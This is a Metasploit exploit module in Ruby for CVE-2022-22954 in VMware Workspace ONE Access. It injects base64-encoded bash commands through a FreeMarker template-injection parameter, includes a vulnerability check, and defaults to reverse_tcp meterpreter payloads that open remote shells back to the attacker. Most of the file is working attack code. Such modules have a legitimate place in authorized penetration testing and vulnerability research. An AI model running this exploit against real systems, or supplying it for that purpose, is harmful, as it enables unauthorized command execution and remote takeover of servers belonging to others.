##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'VMware Workspace ONE Access CVE-2022-22954',
        'Description' => %q{
          This module exploits CVE-2022-22954, an unauthenticated server-side
          template injection (SSTI) in VMware Workspace ONE Access, to execute
          shell commands as the "horizon" user.
        },
        'Author' => [
          'mr_me', # Discovery
          'Udhaya Prakash', # (@sherlocksecure of Poshmark Inc.) PoC
          'wvu' # Exploit and independent analysis
        ],
        'References' => [
          ['CVE', '2022-22954'],
          ['URL', 'https://www.vmware.com/security/advisories/VMSA-2022-0011.html'],
          ['URL', 'https://srcincite.io/advisories/src-2022-0005/'],
          ['URL', 'https://github.com/sherlocksecurity/VMware-CVE-2022-22954'],
          ['URL', 'https://attackerkb.com/topics/BDXyTqY1ld/cve-2022-22954/rapid7-analysis']
          # More context: https://twitter.com/wvuuuuuuuuuuuuu/status/1519476924757778433
        ],
        'DisclosureDate' => '2022-04-06',
        'License' => MSF_LICENSE,
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],
        'Privileged' => false,
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/python/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :dropper,
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/'])
    ])

    register_advanced_options([
      OptFloat.new('CmdExecTimeout', [true, 'Command execution timeout', 3.5])
    ])

    deregister_options('VHOST')
  end

  def check
    ret = execute_command("echo #{token = rand_text_alphanumeric(8..16)}")

    return CheckCode::Unknown unless ret
    return CheckCode::Safe unless ret.match?(/device (?:id|type): #{token}/)

    CheckCode::Vulnerable
  end

  def exploit
    print_status("Executing #{payload_instance.refname} (#{target.name})")

    case target['Type']
    when :cmd
      execute_command(payload.encoded)
    when :dropper
      execute_cmdstager
    end
  end

  def execute_command(cmd, _opts = {})
    # Pass cmd to bash without word splitting
    bash_cmd = "bash -c {eval,$({echo,#{Rex::Text.encode_base64(cmd)}}|{base64,-d})}"

    vprint_status("Executing command: #{bash_cmd}")

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, ssti_uri),
      'vhost' => rand_text_alphanumeric(8..16),
      'vars_get' => {
        %w[code error].sample => rand_text_alphanumeric(8..16),
        # https://freemarker.apache.org/docs/api/freemarker/template/utility/Execute.html
        ssti_param => %(${"freemarker.template.utility.Execute"?new()("#{bash_cmd}")})
      }
    }, datastore['CmdExecTimeout'])

    return unless res
    return '' unless res.code == 400 && res.body.include?('auth.context.invalid')

    res.body
  end

  def ssti_uri
    %w[
      /catalog-portal/hub-ui
      /catalog-portal/hub-ui/byob
      /catalog-portal/ui
      /catalog-portal/ui/oauth/verify
    ].sample
  end

  def ssti_param
    %w[deviceType deviceUdid].sample
  end

end
